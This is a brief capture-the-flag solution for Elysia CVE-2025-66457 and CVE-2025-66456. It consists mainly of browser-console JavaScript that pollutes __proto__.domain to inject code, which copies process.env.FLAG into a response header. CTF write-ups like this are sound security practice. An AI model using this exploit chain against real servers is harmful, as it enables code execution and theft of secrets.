# solution

https://github.com/sportshead/elysia-poc (note to self, make public again after CTF)
- CVE-2025-66457 Cookie config ACE
- CVE-2025-66456 Prototype pollution in schema validation

1. create an account
2. paste in console
```js
await fetch("/storage", {
    "headers": {
        "Content-Type": "application/json",
    },
    "body": `{
    	"key": "foo",
    	"value": "123"
    }`,
    "method": "POST",
});

await fetch("/storage/foo", {
    "headers": {
        "Content-Type": "application/json",
    },
    "body": `{
    	"value": "456",
        "__proto__": {
        	"domain": "' + ( c.set.headers.flag=process.env.FLAG,'') + '"
        }
    }`,
    "method": "PUT",
});

await fetch("/auth/logout", {
    "method": "POST",
}).then(r=>r.headers.get("flag")).then(alert);
```

